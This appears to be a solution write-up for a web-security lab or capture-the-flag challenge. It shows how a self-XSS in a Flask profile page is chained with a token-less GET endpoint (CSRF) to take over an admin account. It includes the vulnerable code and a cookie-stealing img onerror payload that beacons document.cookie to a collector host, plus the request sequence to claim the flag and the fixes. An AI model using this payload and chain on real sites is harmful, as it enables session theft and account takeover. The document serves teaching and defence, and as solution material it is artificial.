# Solution — Self-XSS Chained via CSRF

## Vulnerability class

**CWE-79 (Cross-Site Scripting, self-XSS variant) + CWE-352 (Cross-Site Request
Forgery) · OWASP A03:2021 – Injection.** A self-only XSS (bio rendered raw only on
the owner's own page) is escalated to account takeover by CSRFing the victim's own
bio-update endpoint, which has no anti-CSRF token.

## The two halves

**Self-XSS.** `GET /profile` renders the owning user's bio **raw**:

```python
'<div class="bio">%s</div>' % bio        # /profile — RAW (owner view)
```

while `GET /u/<name>` escapes it:

```python
'<div class="bio">%s</div>' % html.escape(bio)   # /u/<name> — ESCAPED (public)
```

So an `<img src=x onerror=…>` in the bio only executes when the **owner** views
their own profile. You cannot load someone else's `/profile` (it is the owner's own
page — 403 for you), and the public view escapes it. On its own: unexploitable.

**CSRF.** The bio is set by:

```python
@app.get("/profile/update")   # state change over GET
def profile_update():
    if not _is_admin(): return 403
    _bio["admin"] = request.args.get("bio", "")   # NO CSRF token
    return redirect("/profile")
```

Session-gated, but with **no CSRF token** — and exposed over **GET**.

## Why the chain works (and the SameSite detail)

A cross-site request only helps an attacker if it carries the victim's cookie.
Modern cookies default to `SameSite=Lax`, which means:

- a cross-site **top-level GET navigation** → cookie **is** sent;
- a cross-site **POST** (form or fetch) → cookie **is NOT** sent.

`/profile/update` is a **GET**, so an attacker page that top-level-navigates the
admin to it rides the admin's `SameSite=Lax` cookie — the update executes as the
admin. The attacker origin's `/go?to=<url>` emits a `<meta http-equiv=refresh>` to
`<url>`, i.e. a top-level GET navigation:

```
http://attacker:8080/go?to=<url-encoded  http://app:8080/profile/update?bio=<PAYLOAD> >
```

Sequence in the admin's browser:

1. Bot loads the attacker page → meta-refresh to `app/profile/update?bio=<PAYLOAD>`.
2. Top-level GET → Lax cookie sent → the admin's bio is set to `<PAYLOAD>`.
3. `/profile/update` 302-redirects to `/profile`, which renders the bio **raw** →
   the self-XSS runs **in the admin's session** and beacons `document.cookie`
   (non-HttpOnly) to the collector.

## The payload and end-to-end

```
PAYLOAD = <img src=x onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)">

# 1. Queue the attacker page (bot visits it):
POST /report {"url":"http://attacker:8080/go?to=<url-enc http://app:8080/profile/update?bio=<url-enc PAYLOAD>>"}

# 2. Bot: attacker page -> meta-refresh -> /profile/update (Lax GET, admin cookie)
#    -> bio set -> 302 /profile -> self-XSS runs -> beacons the cookie.

# 3. Read the collector, submit the session:
GET  /oob/received            # /report?c=session%3D<32 hex>
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this. Its integrity checks prove the chain is
**necessary**: `/profile` (the raw-render page) is **403** for the attacker, and
`/u/admin` **escapes** the bio — so the payload cannot be viewed into execution any
other way; only the CSRF-planted bio, rendered in the admin's own session, runs.
The default bio is benign, so without the CSRF step the admin's `/profile` carries
no payload and the collector stays empty.

## Why the containment holds

- Collector + attacker + bot live on a `backend` network with `internal: true` — no
  route off the host. The stolen cookie reaches the in-lab collector only.
- `/internal/bot-login` + `/internal/queue` are firewalled to the backend subnet
  (login also gated by `BOT_KEY`); `/profile` and `/profile/update` require the
  admin session, so the attacker can only reach them _through_ the admin's browser.
- Single gunicorn worker keeps the bio consistent between the CSRF write and the
  self-XSS render.

## The fix

1. **Add a CSRF token to the state change (and don't use GET for it).** A
   per-session anti-CSRF token on `POST /profile/update`, verified server-side,
   makes the cross-site request fail — the attacker cannot read the token to
   include it. `SameSite=Strict` on the session cookie is defence-in-depth (it
   would also stop the top-level-GET vector).
2. **Encode the bio everywhere, including the owner's own view.** The root cause is
   still an XSS sink; `html.escape` on `/profile` too (there is no reason to render
   a bio as raw HTML) removes it regardless of how the bio got set.
3. **Stop treating self-XSS as unexploitable.** "It's only self-XSS" ignores that
   any token-less state change (CSRF, login/logout CSRF, an open redirect, a cache)
   can deliver the payload into the victim's own session.

## Deviation from the catalog stack

The catalogued scenario is a **Laravel + MySQL** profile app whose update is a
**POST** form CSRF'd from a separate attacker vhost. This lab **re-platforms to
Flask** and makes the update a **GET**: on this plain-HTTP lab a cross-site **POST**
does **not** carry a `SameSite=Lax` cookie (only top-level safe-method navigations
do), so the sound CSRF vector in this environment is a GET state change driven by a
top-level navigation (`<meta refresh>` from the mock attacker origin). The taught
chain — self-XSS + a token-less state change → account takeover — is identical;
Laravel/MySQL are incidental. The Playwright verifier stands in for Puppeteer.
